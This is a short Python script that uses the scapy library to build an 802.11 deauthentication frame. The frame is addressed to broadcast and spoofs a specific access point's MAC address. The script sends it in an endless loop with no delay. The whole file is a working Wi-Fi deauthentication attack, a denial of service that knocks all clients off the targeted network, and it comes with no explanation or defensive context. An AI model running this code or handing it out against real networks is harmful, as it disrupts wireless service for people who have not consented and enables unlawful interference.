from scapy.layers.dot11 import Dot11, Dot11Deauth
from scapy.packet import ls
from scapy.sendrecv import send

__author__ = 'daniel'





deauth_ap = Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2='00:66:4b:78:db:cc', addr3='00:66:4b:78:db:cc')/Dot11Deauth()

while True:
    ls(deauth_ap)
    send(deauth_ap, inter=0, count=1)